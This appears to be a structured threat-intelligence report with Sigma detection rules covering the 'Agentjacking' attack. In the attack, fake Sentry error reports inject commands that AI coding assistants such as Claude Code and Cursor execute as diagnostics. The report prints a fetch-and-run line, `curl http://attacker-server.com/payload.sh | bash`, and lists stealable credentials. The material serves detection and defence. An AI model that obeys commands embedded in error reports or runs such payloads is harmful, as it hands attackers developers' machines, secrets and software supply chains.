report_name: New 'Agentjacking' Attack Turns AI Coding Assistants into Malicious Insiders

attack_patterns.name: LLM Prompt Injection
attack_patterns.description: Attackers inject malicious commands into a fake Sentry error report. The AI coding assistant ingests this report and, misinterpreting the commands as valid diagnostic steps, executes them. This represents an indirect prompt injection attack vector.

attack_patterns.name: Command and Scripting Interpreter
attack_patterns.description: The hijacked AI agent executes malicious commands, such as `curl http://attacker-server.com/payload.sh | bash`, within the developer's terminal environment, leveraging its built-in shell access.

attack_patterns.name: Gather Victim Host Information
attack_patterns.description: Attackers discover publicly exposed Sentry Data Source Names (DSNs) by inspecting the source code of a target organization's website, which provides the entry point for injecting malicious error reports.

attack_patterns.name: Compromise Software Dependencies and Development Tools
attack_patterns.description: By compromising a developer's machine via Agentjacking, an attacker can inject malicious code into the company's software products, leading to a software supply chain compromise that affects downstream customers.

attack_patterns.name: AI Agent Tool Invocation
attack_patterns.description: The AI coding assistant is tricked into invoking a shell (`bash`) to download and execute a malicious script, abusing the agent's legitimate capability to interact with system tools.

attack_patterns.name: Unsecured Credentials
attack_patterns.description: A successful Agentjacking attack can lead to the exfiltration of unsecured credentials from the developer's machine, including `.env` files, SSH keys, AWS credentials, and Git tokens.

tools.name: Sentry
tools.description: The Sentry error tracking platform is abused as the injection vector for the Agentjacking attack, where attackers submit fake error reports containing malicious commands to a public DSN.

tools.name: Claude Code
tools.description: An AI-powered coding assistant that can be hijacked via the Agentjacking technique to execute arbitrary code on a developer's machine.

tools.name: Cursor
tools.description: An AI-powered coding assistant that can be hijacked via the Agentjacking technique to execute arbitrary code on a developer's machine.

tools.name: curl
tools.description: The command-line tool `curl` is used in the malicious payload to download a script from an attacker-controlled server for execution.

campaigns.name: Agentjacking
campaigns.description: A novel attack vector that hijacks AI coding assistants by injecting malicious commands into trusted external data sources like Sentry error reports, leading to remote code execution on a developer's machine.
campaigns.objective: Gain remote code execution on developer workstations to steal credentials, source code, and facilitate software supply chain attacks.

identities.name: Software Developers
identities.description: The primary individual targets of the Agentjacking attack, whose workstations and credentials are compromised.

identities.name: Organizations with exposed Sentry DSNs
identities.description: Organizations whose public-facing applications expose a Sentry DSN, making them vulnerable to the injection of fake error reports used in Agentjacking attacks.

infrastructure.name: Attacker Payload Server
infrastructure.description: An attacker-controlled server used to host the malicious payload script that is downloaded and executed by the compromised AI agent.

indicators.name: Suspicious Script Execution via Curl Pipe to Shell
indicators.pattern:
title: Suspicious Script Execution via Curl Pipe to Shell
id: 2b9a8c1d-4e5f-4a9b-8c1d-2b9a8c1d4e5f
status: experimental
description: Detects the use of curl to download a script and pipe it directly to a shell for execution. This is a common technique for initial access and payload delivery, seen in attacks like Agentjacking.
references:
  - https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html
author: cyber.netsecops.io
date: 2026-06-20
tags:
  - attack.t1059
  - attack.execution
falsepositives:
  - Legitimate administrative scripts, though this pattern is highly suspicious.
level: high
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains|all:
      - 'curl '
      - ' | '
      - 'bash'
    CommandLine|contains:
      - 'http://'
      - 'https://'
  condition: selection
indicators.description: Detects the `curl [URL] | bash` pattern used in the Agentjacking attack to download and execute a malicious payload.

indicators.name: Agentjacking Payload Download
indicators.x_netsecio_sigma_rule:
title: Agentjacking Payload Download IOC
id: 8f9e0d1c-2b3a-4d5e-8f9e-0d1c2b3a4d5e
status: experimental
description: Detects network connections to domains or URLs associated with the Agentjacking attack.
references:
  - https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html
author: cyber.netsecops.io
date: 2026-06-20
tags:
  - attack.t1105
  - attack.command_and_control
falsepositives:
  - None known.
level: critical
logsource:
  category: dns_query
detection:
  selection:
    QueryName|endswith:
      - 'attacker-server.com'
  condition: selection
indicators.description: Detects network traffic to the example attacker-controlled domain used to host the malicious payload in the Agentjacking attack.

indicators.name: Cursor AI Assistant Execution
indicators.x_netsecio_sigma_rule:
title: Cursor AI Assistant Execution
id: 1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: Detects the execution of the Cursor AI assistant. While a legitimate tool, its presence indicates an environment that could be targeted by Agentjacking attacks.
references:
  - https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html
author: cyber.netsecops.io
date: 2026-06-20
tags:
  - attack.t1204
falsepositives:
  - Legitimate use of the Cursor application.
level: informational
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '\cursor.exe'
      - '/cursor'
  condition: selection
indicators.description: Detects the execution of the Cursor AI assistant process, which is a target of the Agentjacking attack.

relationships.target_name: Compromise Software Dependencies and Development Tools

relationships.source_name: Suspicious Script Execution via Curl Pipe to Shell
